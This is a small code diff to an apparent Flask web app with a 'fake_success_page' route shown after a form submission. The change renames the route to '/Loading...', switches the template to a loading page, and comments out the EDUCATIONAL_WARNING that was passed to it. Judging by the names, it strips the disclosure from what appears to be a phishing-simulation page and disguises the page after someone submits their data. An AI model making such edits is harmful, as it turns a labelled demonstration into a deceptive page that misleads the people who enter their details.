@@ -307,10 +307,10 @@ def handle_submission(custom_path):
     
     return redirect(url_for('fake_success_page', custom_path=custom_path))
 
-@app.route('/<path:custom_path>/success')
+@app.route('/<path:custom_path>/Loading...')
 def fake_success_page(custom_path):
-    return render_template('success.html', 
-                         warning=EDUCATIONAL_WARNING,
+    return render_template('loading.html', 
+                        #  warning=EDUCATIONAL_WARNING,
                          custom_path=custom_path)
 
 @app.route('/manage-urls')
